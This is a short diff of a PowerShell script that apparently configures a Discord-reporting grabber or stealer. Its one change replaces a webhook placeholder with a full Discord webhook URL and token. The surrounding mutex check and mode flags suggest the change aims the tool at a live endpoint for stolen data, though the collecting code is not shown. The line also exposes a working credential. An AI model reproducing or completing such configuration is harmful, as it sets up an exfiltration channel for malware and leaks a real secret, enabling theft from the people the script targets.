@@ -12,7 +12,7 @@ function Compare-Mutex {
 
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 
-$webhook = "YOUR_WEBHOOK_HERE"
+$webhook = "https://discord.com/api/webhooks/1209705035357880372/SH6U2qDEsDULiNEGSukitxZNWxYwkYXpcV8EBGn1lVH4rXaW1u8c4rRz45MsX0HGaoAq"
 $debug_mode = $false
 $udc_mode = $true
 
